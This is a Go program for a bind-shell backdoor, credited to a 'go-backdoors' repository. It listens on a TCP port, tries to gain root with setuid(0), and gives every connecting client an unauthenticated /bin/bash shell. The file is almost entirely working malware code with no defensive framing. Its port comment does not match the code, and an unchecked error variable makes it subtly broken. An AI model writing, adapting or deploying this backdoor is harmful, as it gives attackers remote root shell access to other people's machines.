package main

import 
(
"fmt"
"net"
"os/exec"
"syscall"
)
//learned connection handling from: https://github.com/LukeDSchenk/go-backdoors/blob/master/bindshell.go
//After a connection is made, it creates a bash shell
func spawnshell(conn net.Conn) {
    //lists the machine that connected
    fmt.Printf("\n[+] Received connection from %v\n", conn.RemoteAddr().String())
    //(On the client's interface), returns the information that a connection has been established
    conn.Write([]byte("[+] Connection established!\n"))
    spawn := exec.Command("/bin/bash")
    spawn.Stdin = conn
    spawn.Stdout = conn
    spawn.Stderr = conn
    spawn.Run()
}
func main() {
  	//Listens on port 6553
	ln, err := net.Listen("tcp", ":6556")
	fmt.Printf("[*] Listening...")
  	//Gets root (uid 0)
	syscall.Setuid(0)
  	for 1==1 {
    	//accepts all connection requests made
    		con, err := ln.Accept()
    		//error handling
        	if err != nil {
            		fmt.Printf("An error occurred during an attempted connection: %v\n", err)
        	} else {
          		fmt.Printf("\n[+] Connection established")
        	}
    //once connecton is established, spawn the shell
    go spawnshell(con)
  }
}
